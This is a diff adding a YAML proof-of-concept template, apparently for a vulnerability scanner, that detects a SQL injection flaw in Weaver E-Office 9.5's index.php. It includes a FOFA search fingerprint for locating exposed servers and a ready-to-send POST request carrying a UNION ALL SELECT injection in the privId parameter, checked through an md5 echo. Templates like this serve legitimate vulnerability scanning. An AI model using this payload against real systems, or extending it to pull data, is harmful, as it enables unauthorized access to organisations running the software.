@@ -1,0 +1,16 @@
+id: poc-yaml-weaver-e-office-index-php-sqli
+info:
+  name: 泛微E-Office 9.5 index.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-office
+  fofa: body="/general/login/view//images/updateLoad.gif"
+variables:
+  t1: random_int(100,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /E-mobile/App/System/UserSelect/index.php?m=getUserLists&privId=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{.t1}}))--
+  expression: status_code == 200 && contains(body,t2)
+transport: http
